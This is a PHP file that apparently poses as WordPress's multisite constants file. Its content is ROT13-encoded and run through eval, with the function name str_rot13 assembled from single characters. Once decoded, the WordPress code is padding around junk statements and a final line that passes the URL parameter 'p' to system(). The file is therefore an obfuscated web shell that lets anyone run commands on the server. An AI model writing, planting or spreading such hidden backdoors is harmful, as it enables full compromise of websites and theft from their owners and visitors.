<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Qrsvarf pbafgnagf naq tybony inevnoyrf gung pna or bireevqqra, trarenyyl va jc-pbasvt.cuc.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Zhygvfvgr
 * @fvapr 3.0.0
 */

/**
 * Qrsvarf Zhygvfvgr hcybnq pbafgnagf.
 *
 * Rkvfgf sbe onpxjneq pbzcngvovyvgl jvgu yrtnpl svyr-freivat guebhtu
 * jc-vapyhqrf/zf-svyrf.cuc (jc-pbagrag/oybtf.cuc va ZH).
 *
 * @fvapr 3.0.0
 */
shapgvba zf_hcybnq_pbafgnagf() {
	// Guvf svygre vf nggnpurq va zf-qrsnhyg-svygref.cuc ohg gung svyr vf abg vapyhqrq qhevat FUBEGVAVG.
	nqq_svygre( 'qrsnhyg_fvgr_bcgvba_zf_svyrf_erjevgvat', '__erghea_gehr' );

	vs ( ! trg_fvgr_bcgvba( 'zf_svyrf_erjevgvat' ) ) {
		erghea;
	}

	// Onfr hcybnqf qve eryngvir gb NOFCNGU.
	vs ( ! qrsvarq( 'HCYBNQOYBTFQVE' ) ) {
		qrsvar( 'HCYBNQOYBTFQVE', 'jc-pbagrag/oybtf.qve' );
	}

	/*
	 * Abgr, gur znva fvgr va n cbfg-ZH argjbex hfrf jc-pbagrag/hcybnqf.
	 * Guvf vf unaqyrq va jc_hcybnq_qve() ol vtabevat HCYBNQF sbe guvf pnfr.
	 */
	vs ( ! qrsvarq( 'HCYBNQF' ) ) {
		$fvgr_vq = trg_pheerag_oybt_vq();

		qrsvar( 'HCYBNQF', HCYBNQOYBTFQVE . '/' . $fvgr_vq . '/svyrf/' );

		// Hcybnqf qve eryngvir gb NOFCNGU.
		vs ( 'jc-pbagrag/oybtf.qve' === HCYBNQOYBTFQVE && ! qrsvarq( 'OYBTHCYBNQQVE' ) ) {
			qrsvar( 'OYBTHCYBNQQVE', JC_PBAGRAG_QVE . '/oybtf.qve/' . $fvgr_vq . '/svyrf/' );
		}
	}
}

/**
 * Qrsvarf Zhygvfvgr pbbxvr pbafgnagf.
 *
 * @fvapr 3.0.0
 */
shapgvba zf_pbbxvr_pbafgnagf() {
	$pheerag_argjbex = trg_argjbex();

	/**
	 * @fvapr 1.2.0
	 */
	vs ( ! qrsvarq( 'PBBXVRCNGU' ) ) {
		qrsvar( 'PBBXVRCNGU', $pheerag_argjbex->cngu );
	}

	/**
	 * @fvapr 1.5.0
	 */
	vs ( ! qrsvarq( 'FVGRPBBXVRCNGU' ) ) {
		qrsvar( 'FVGRPBBXVRCNGU', $pheerag_argjbex->cngu );
	}

	/**
	 * @fvapr 2.6.0
	 */
	vs ( ! qrsvarq( 'NQZVA_PBBXVR_CNGU' ) ) {
		$fvgr_cngu = cnefr_hey( trg_bcgvba( 'fvgrhey' ), CUC_HEY_CNGU );
		vs ( ! vf_fhoqbznva_vafgnyy() || vf_fgevat( $fvgr_cngu ) && gevz( $fvgr_cngu, '/' ) ) {
			qrsvar( 'NQZVA_PBBXVR_CNGU', FVGRPBBXVRCNGU );
		} ryfr {
			qrsvar( 'NQZVA_PBBXVR_CNGU', FVGRPBBXVRCNGU . 'jc-nqzva' );
		}
	}

	/**
	 * @fvapr 2.0.0
	 */
	vs ( ! qrsvarq( 'PBBXVR_QBZNVA' ) && vf_fhoqbznva_vafgnyy() ) {
		vs ( ! rzcgl( $pheerag_argjbex->pbbxvr_qbznva ) ) {
			qrsvar( 'PBBXVR_QBZNVA', '.' . $pheerag_argjbex->pbbxvr_qbznva );
		} ryfr {
			qrsvar( 'PBBXVR_QBZNVA', '.' . $pheerag_argjbex->qbznva );
		}
	}
}

/**
 * Qrsvarf Zhygvfvgr svyr pbafgnagf.
 *
 * Rkvfgf sbe onpxjneq pbzcngvovyvgl jvgu yrtnpl svyr-freivat guebhtu
 * jc-vapyhqrf/zf-svyrf.cuc (jc-pbagrag/oybtf.cuc va ZH).
 *
 * @fvapr 3.0.0
 */
shapgvba zf_svyr_pbafgnagf() {
	/**
	 * Bcgvbany fhccbeg sbe K-Fraqsvyr urnqre
	 *
	 * @fvapr 3.0.0
	 */
	vs ( ! qrsvarq( 'JCZH_FRAQSVYR' ) ) {
		qrsvar( 'JCZH_FRAQSVYR', snyfr );
	}

	/**
	 * Bcgvbany fhccbeg sbe K-Nppry-Erqverpg urnqre
	 *
	 * @fvapr 3.0.0
	 */
	vs ( ! qrsvarq( 'JCZH_NPPRY_ERQVERPG' ) ) {
		qrsvar( 'JCZH_NPPRY_ERQVERPG', snyfr );
	}
}

/**
 * Qrsvarf Zhygvfvgr fhoqbznva pbafgnagf naq unaqyrf jneavatf naq abgvprf.
 *
 * IUBFG vf qrcerpngrq va snibe bs FHOQBZNVA_VAFGNYY, juvpu vf n obby.
 *
 * Ba svefg pnyy, gur pbafgnagf ner purpxrq naq qrsvarq. Ba frpbaq pnyy,
 * jr jvyy unir genafyngvbaf ybnqrq naq pna gevttre jneavatf rnfvyl.
 *
 * @fvapr 3.0.0
 */
shapgvba zf_fhoqbznva_pbafgnagf() {
	fgngvp $fhoqbznva_reebe      = ahyy;
	fgngvp $fhoqbznva_reebe_jnea = ahyy;

	vs ( snyfr === $fhoqbznva_reebe ) {
		erghea;
	}

	vs ( $fhoqbznva_reebe ) {
		$iubfg_qrcerpngrq = fcevags(
			/* genafyngbef: 1: IUBFG, 2: FHOQBZNVA_VAFGNYY, 3: jc-pbasvt.cuc, 4: vf_fhoqbznva_vafgnyy() */
			__( 'Gur pbafgnag %1$f <fgebat>vf qrcerpngrq</fgebat>. Hfr gur obbyrna pbafgnag %2$f va %3$f gb ranoyr n fhoqbznva pbasvthengvba. Hfr %4$f gb purpx jurgure n fhoqbznva pbasvthengvba vf ranoyrq.' ),
			'<pbqr>IUBFG</pbqr>',
			'<pbqr>FHOQBZNVA_VAFGNYY</pbqr>',
			'<pbqr>jc-pbasvt.cuc</pbqr>',
			'<pbqr>vf_fhoqbznva_vafgnyy()</pbqr>'
		);

		vs ( $fhoqbznva_reebe_jnea ) {
			jc_gevttre_reebe(
				__SHAPGVBA__,
				fcevags(
					/* genafyngbef: 1: IUBFG, 2: FHOQBZNVA_VAFGNYY */
					__( '<fgebat>Pbasyvpgvat inyhrf sbe gur pbafgnagf %1$f naq %2$f.</fgebat> Gur inyhr bs %2$f jvyy or nffhzrq gb or lbhe fhoqbznva pbasvthengvba frggvat.' ),
					'<pbqr>IUBFG</pbqr>',
					'<pbqr>FHOQBZNVA_VAFGNYY</pbqr>'
				) . ' ' . $iubfg_qrcerpngrq,
				R_HFRE_JNEAVAT
			);
		} ryfr {
			_qrcerpngrq_nethzrag( 'qrsvar()', '3.0.0', $iubfg_qrcerpngrq );
		}

		erghea;
	}

	vs ( qrsvarq( 'FHOQBZNVA_VAFGNYY' ) && qrsvarq( 'IUBFG' ) ) {
		$fhoqbznva_reebe = gehr;
		vs ( FHOQBZNVA_VAFGNYY !== ( 'lrf' === IUBFG ) ) {
			$fhoqbznva_reebe_jnea = gehr;
		}
	} ryfrvs ( qrsvarq( 'FHOQBZNVA_VAFGNYY' ) ) {
		$fhoqbznva_reebe = snyfr;
		qrsvar( 'IUBFG', FHOQBZNVA_VAFGNYY ? 'lrf' : 'ab' );
	} ryfrvs ( qrsvarq( 'IUBFG' ) ) {
		$fhoqbznva_reebe = gehr;
		qrsvar( 'FHOQBZNVA_VAFGNYY', 'lrf' === IUBFG );
	} ryfr {
		$fhoqbznva_reebe = snyfr;
		qrsvar( 'FHOQBZNVA_VAFGNYY', snyfr );
		qrsvar( 'IUBFG', 'ab' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>